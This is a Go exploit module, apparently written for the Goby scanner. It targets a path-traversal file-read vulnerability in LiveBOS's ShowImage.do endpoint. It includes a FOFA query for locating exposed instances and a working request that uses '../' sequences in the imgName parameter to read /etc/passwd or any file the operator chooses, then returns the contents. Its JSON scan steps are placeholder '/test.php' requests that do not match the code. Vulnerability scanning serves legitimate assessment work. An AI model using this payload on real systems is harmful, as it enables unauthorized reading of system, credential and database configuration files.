package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LiveBos ShowImage.do file imgName parameter reading vulnerability",
    "Description": "<p>LiveBOS (LiveBOS for short) is an object-based business architecture middleware and its integrated development tool developed by Vertex Software Co., Ltd. It centers on the establishment of business models and directly completes the innovative software development mode of software development. It is suitable for the development of various WEB-based professional application software and large-scale industry applications.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
    "Product": "apex-LiveBPM",
    "Homepage": "https://www.apexsoft.com.cn/ApexsoftSearch.jsp?s_content=bpm",
    "DisclosureDate": "2023-08-12",
    "PostTime": "2023-08-12",
    "Author": "1691834629@qq.com",
    "FofaQuery": " body=\"LiveBos\" || body=\"/react/browser/loginBackground.png\"",
    "GobyQuery": " body=\"LiveBos\" || body=\"/react/browser/loginBackground.png\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. The official has temporarily fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.livebos.com/\">https://www.livebos.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "LiveBos ShowImage.do 文件 imgName 参数读取漏洞",
            "Product": "apex-LiveBPM",
            "Description": "<p>LiveBOS（简称LiveBOS）是顶点软件股份有限公司开发的一个对象型业务架构中间件及其集成开发工具。它以业务模型建立为中心，直接完成软件开发的创新软件开发模式。适合于各类基于WEB的专业应用软件与行业大型应用的开发。<br></p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方暂已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.livebos.com/\" target=\"_blank\">https://www.livebos.com/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "LiveBos ShowImage.do file imgName parameter reading vulnerability",
            "Product": "apex-LiveBPM",
            "Description": "<p>LiveBOS (LiveBOS for short) is an object-based business architecture middleware and its integrated development tool developed by Vertex Software Co., Ltd. It centers on the establishment of business models and directly completes the innovative software development mode of software development. It is suitable for the development of various WEB-based professional application software and large-scale industry applications.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., making the website extremely insecure.</p>",
            "Recommendation": "<p>1. The official has temporarily fixed the vulnerability, please contact the manufacturer to fix the vulnerability: <a href=\"https://www.livebos.com/\" target=\"_blank\">https://www.livebos.com/</a></p><p>2. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>3. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10821"
}`
	sendPayload12Iuskwlan := func(hostInfo *httpclient.FixUrl, url, param string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(url)
		if param != "" {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.Data = param
		}
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayload12Iuskwlan(hostInfo, "/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd", "")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "root:")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := goutils.B2S(ss.Params["filePath"])
			resp, err := sendPayload12Iuskwlan(expResult.HostInfo, "/feed/ShowImage.do;.js.jsp?type=&imgName="+filePath, "")
			if err != nil {
				expResult.Success = false
				return expResult
			}
			expResult.Success = resp.StatusCode == 200
			expResult.Output = resp.Utf8Html
			return expResult
		},
	))
}
